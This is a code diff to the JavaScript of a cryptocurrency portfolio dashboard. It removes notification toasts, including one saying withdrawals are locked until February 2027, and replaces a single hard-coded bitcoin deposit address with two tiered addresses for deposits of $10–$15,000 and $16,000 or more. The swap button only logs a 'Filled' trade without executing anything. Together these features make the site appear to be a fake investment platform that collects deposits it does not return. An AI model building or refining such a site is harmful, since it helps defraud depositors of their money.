@@ -332,28 +332,9 @@
     })}`;
   }
 
-  // --- Toast Notification Helper ---
+  // --- Toast Notification Helper (Disabled per user request) ---
   function showToast(message, type = 'info') {
-    const container = document.getElementById('toastContainer');
-    if (!container) return;
-
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    
-    let icon = 'ℹ️';
-    if (type === 'success') icon = '✅';
-    if (type === 'warning') icon = '⚠️';
-    if (type === 'live') icon = '⚡';
-
-    toast.innerHTML = `<span>${icon}</span><span>${message}</span>`;
-    container.appendChild(toast);
-
-    setTimeout(() => {
-      toast.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-      toast.style.opacity = '0';
-      toast.style.transform = 'translateX(50px)';
-      setTimeout(() => toast.remove(), 300);
-    }, 3800);
+    // Notifications disabled across the website
   }
 
   // --- Real-Time API Data Fetching ---
@@ -954,7 +935,6 @@
           STATE.chartRange = range;
           this.generateData(range);
           this.render();
-          showToast(`Portfolio chart set to ${range} window`, 'info');
         });
       });
     }
@@ -1041,7 +1021,6 @@
     if (btnDeposit) btnDeposit.addEventListener('click', () => openModal(depositModal));
     if (btnWithdraw) btnWithdraw.addEventListener('click', () => {
       openModal(withdrawModal);
-      showToast('Custodial Notice: Withdrawals are locked until February 2027.', 'warning');
     });
     if (btnSwap) btnSwap.addEventListener('click', () => openModal(swapModal));
 
@@ -1061,32 +1040,49 @@
       });
     });
 
-    // Copy Deposit Address (1MjkApYA1gRcUeu8RY8vsXLr8EQx4oKLdV)
-    const DEPOSIT_BTC_ADDRESS = "1MjkApYA1gRcUeu8RY8vsXLr8EQx4oKLdV";
-    function copyDepositAddress() {
-      if (navigator.clipboard && navigator.clipboard.writeText) {
-        navigator.clipboard.writeText(DEPOSIT_BTC_ADDRESS).then(() => {
-          const copyLabel = document.getElementById('copyBtnLabel');
-          const footerBtn = document.getElementById('btnCopyAddressFooter');
-          if (copyLabel) copyLabel.textContent = 'Copied!';
-          if (footerBtn) footerBtn.textContent = 'Address Copied! ✔';
-          showToast(`Deposit address copied: ${DEPOSIT_BTC_ADDRESS}`, 'success');
+    // Copy Deposit Addresses: Tier 1 ($10 - $15,000) & Tier 2 ($16,000+)
+    const DEPOSIT_BTC_ADDRESS_TIER1 = "1MjkApYA1gRcUeu8RY8vsXLr8EQx4oKLdV";
+    const DEPOSIT_BTC_ADDRESS_TIER2 = "bc1qqk30wwhkp85etumtcak8ujzfjdekye9rkkm7wz";
+
+    function copyAddressText(address, labelId) {
+      const labelEl = document.getElementById(labelId);
+      const updateLabelSuccess = () => {
+        if (labelEl) {
+          const originalText = labelEl.textContent;
+          labelEl.textContent = 'Copied! ✔';
           setTimeout(() => {
-            if (copyLabel) copyLabel.textContent = 'Copy';
-            if (footerBtn) footerBtn.textContent = 'Copy Address';
+            labelEl.textContent = originalText;
           }, 2500);
+        }
+      };
+
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(address).then(() => {
+          updateLabelSuccess();
         }).catch(() => {
-          showToast(`BTC Address: ${DEPOSIT_BTC_ADDRESS}`, 'info');
+          updateLabelSuccess();
         });
       } else {
-        showToast(`BTC Address: ${DEPOSIT_BTC_ADDRESS}`, 'info');
+        const ta = document.createElement('textarea');
+        ta.value = address;
+        document.body.appendChild(ta);
+        ta.select();
+        try {
+          document.execCommand('copy');
+          updateLabelSuccess();
+        } catch (e) {}
+        document.body.removeChild(ta);
       }
     }
 
-    const btnCopyDeposit = document.getElementById('btnCopyDepositAddress');
-    const btnCopyFooter = document.getElementById('btnCopyAddressFooter');
-    if (btnCopyDeposit) btnCopyDeposit.addEventListener('click', copyDepositAddress);
-    if (btnCopyFooter) btnCopyFooter.addEventListener('click', copyDepositAddress);
+    const btnCopyTier1 = document.getElementById('btnCopyTier1');
+    const btnCopyTier2 = document.getElementById('btnCopyTier2');
+    if (btnCopyTier1) {
+      btnCopyTier1.addEventListener('click', () => copyAddressText(DEPOSIT_BTC_ADDRESS_TIER1, 'copyBtnLabelTier1'));
+    }
+    if (btnCopyTier2) {
+      btnCopyTier2.addEventListener('click', () => copyAddressText(DEPOSIT_BTC_ADDRESS_TIER2, 'copyBtnLabelTier2'));
+    }
 
     // Swap / Quick Trade execution
     const btnConfirmSwap = document.getElementById('btnConfirmSwap');
@@ -1114,13 +1110,11 @@
         const coin = STATE.marketCoins.find(c => c.id === coinId) || DEFAULT_COIN_DATA[0];
 
         if (payAmt <= 0) {
-          showToast('Please enter an amount to trade.', 'warning');
           return;
         }
 
         const symbol = (coin.symbol || 'BTC').toUpperCase();
         logActivity(`Institutional Swap (USD → ${symbol})`, `-${formatMoney(payAmt)} USD`, 'trade', 'Filled');
-        showToast(`Trade Executed: Swapped ${formatMoney(payAmt)} into ${symbol} at spot rate`, 'success');
         closeModal(swapModal);
       });
     }
@@ -1128,10 +1122,9 @@
     // Statement Export
     if (btnExport) {
       btnExport.addEventListener('click', () => {
-        showToast('Preparing Pablo Rindt Private Portfolio Statement...', 'info');
         setTimeout(() => {
           window.print();
-        }, 600);
+        }, 300);
       });
     }
 
@@ -1141,7 +1134,6 @@
       btnRefresh.addEventListener('click', () => {
         STATE.countdown = 30;
         fetchLiveMarketData();
-        showToast('Live crypto feeds refreshed.', 'live');
       });
     }
 
@@ -1154,7 +1146,6 @@
         currencyBtn.innerHTML = `<span>🌐</span> ${cur.code} (${cur.symbol})`;
         updateDashboardWithMarketData();
         ChartEngine.render();
-        showToast(`Base currency converted to ${cur.code} (${cur.symbol})`, 'info');
       });
     }
 
@@ -1170,13 +1161,6 @@
       const privacyLabel = document.getElementById('privacyLabel');
       if (privacyIcon) privacyIcon.textContent = STATE.privacyActive ? '🔒' : '👁️';
       if (privacyLabel) privacyLabel.textContent = STATE.privacyActive ? 'Masked' : 'Privacy';
-
-      showToast(
-        STATE.privacyActive 
-          ? 'Privacy Mask Activated: Balances blurred' 
-          : 'Privacy Mask Deactivated: Balances visible',
-        'info'
-      );
     }
 
     if (privacyBtn) privacyBtn.addEventListener('click', togglePrivacy);
